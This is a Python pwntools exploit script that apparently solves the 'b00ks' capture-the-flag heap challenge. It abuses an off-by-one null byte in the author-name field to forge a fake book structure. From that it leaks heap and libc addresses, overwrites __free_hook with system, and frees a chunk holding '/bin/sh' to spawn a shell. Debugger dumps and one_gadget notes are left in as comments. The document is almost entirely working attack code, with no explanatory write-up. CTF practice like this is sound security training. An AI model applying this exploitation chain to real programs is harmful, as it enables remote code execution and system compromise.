from pwn import *
context.log_level = 'info'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
elf = ELF('./b00ks')

def create(name, name_size, description, des_size):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('Enter book name size: ')
	p.sendline(str(name_size))
	p.recvuntil("Enter book name (Max 32 chars): ")
	p.sendline(name)
	p.recvuntil("Enter book description size: ")
	p.sendline(str(des_size))
	p.recvuntil("Enter book description: ")
	p.sendline(description)

def delete(id):
	p.recvuntil('> ')
	p.sendline('2')
	p.recvuntil("Enter the book id you want to delete: ")
	p.sendline(str(id))

def edit(id, description):
	p.recvuntil('> ')
	p.sendline('3')
	p.recvuntil("Enter the book id you want to edit: ")
	p.sendline(str(id))
	p.recvuntil("Enter new book description: ")
	p.sendline(description)

def print_book_detail(id):
	p.recvuntil('> ')
	p.sendline('4')
	dicts = {'id':[], 'name':[], 'description':[], 'author':[]}
	for i in range(id):
		try:
			p.recvuntil("ID: ",timeout=1)
			dicts['id'].append(int(p.recvuntil('\n',drop=True)))
			p.recvuntil('Name: ')
			dicts['name'].append(p.recvuntil('\n',drop=True))
			p.recvuntil('Description: ')
			dicts['description'].append(p.recvuntil('\n',drop=True))
			p.recvuntil('Author: ')
			dicts['author'].append(p.recvuntil('\n',drop=True))
		except:
			return dicts['id'],dicts['name'],dicts['description'],dicts['author']
	return dicts['id'],dicts['name'],dicts['description'],dicts['author']
def change_auther_name(name):
	p.recvuntil('> ')
	p.sendline('5')
	p.recvuntil("Enter author name: ")
	p.sendline(name)

def create_auhter_name(name):
	p.recvuntil("Enter author name: ")
	p.sendline(name)

def debug():
	gdb.attach(p)
	pause()

# create_auhter_name('A'*30)
# create('a',10,'b',10)
# debug()
# pwndbg> search "AAAAA"
# b00ks           0x55818f92b040 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
# b00ks           0x55818f92b045 'AAAAAAAAAAAAAAAAAAAAAAAAA'
# b00ks           0x55818f92b04a 'AAAAAAAAAAAAAAAAAAAA'
# b00ks           0x55818f92b04f 'AAAAAAAAAAAAAAA'
# b00ks           0x55818f92b054 'AAAAAAAAAA'
# b00ks           0x55818f92b059 0x6000004141414141 /* 'AAAAA' */
# warning: Unable to access 16000 bytes of target memory at 0x7f801f492d04, halting search.
# pwndbg> x/16g 0x55818f92b040
# 0x55818f92b040:	0x4141414141414141	0x4141414141414141
# 0x55818f92b050:	0x4141414141414141	0x0000414141414141
# 0x55818f92b060:	0x000055818f9bc060	0x0000000000000000

p = process('./b00ks')
# p = remote('node3.buuoj.cn',29670)
create_auhter_name('A'*32)
create('a', 0xd0, 'b', 32)
# here need to calcculate the value(0xd0),need to make name's true size is 0xe0
create('c',0x21000, 'd', 0x21000)

book1_id, book1_name, book1_des, author = print_book_detail(1)
library_book = u64(author[0][32:32+6].ljust(8,'\x00'))
log.success('library_book = %#x',library_book)

fake_book1 = p64(1)+ p64(library_book+0x38) + p64(library_book + 0x40) + pack(0xffff)
# id,name,descripton,len(descritpion)
edit(book1_id[0],fake_book1)
change_auther_name('A'*32)
# cover the library_book's lowest bytes to 0x00,and make it point to book1's descritption, and print our fake book1 to leak libc
# debug()

book2_id, book2_name, book2_des, author = print_book_detail(1)
book2_name = u64(book2_name[0].ljust(8,'\x00'))
book2_des = u64(book2_des[0].ljust(8,'\x00'))
log.success('book2_name = %#x, book2_des = %#x'%(book2_name,book2_des))
# debug()

# 0x7fdc89c6f000-0x7fdc896e4000=0x58b000
libc_base = book2_des - (0x58b000 + 0x10)
free_hook = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']
binsh = libc_base + libc.search("/bin/sh").next()
one_gadget = libc_base + 0x45216
# execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL
log.info('libc_base = %#x, free_hook = %#x, one_gadget = %#x'%(libc_base,free_hook,one_gadget))

# edit(1, p64(free_hook)*2)
# edit(2, p64(one_gadget))
payload = p64(binsh)+p64(free_hook)

edit(1,payload)
debug()
edit(2,p64(system_addr))

delete(2)
p.interactive()
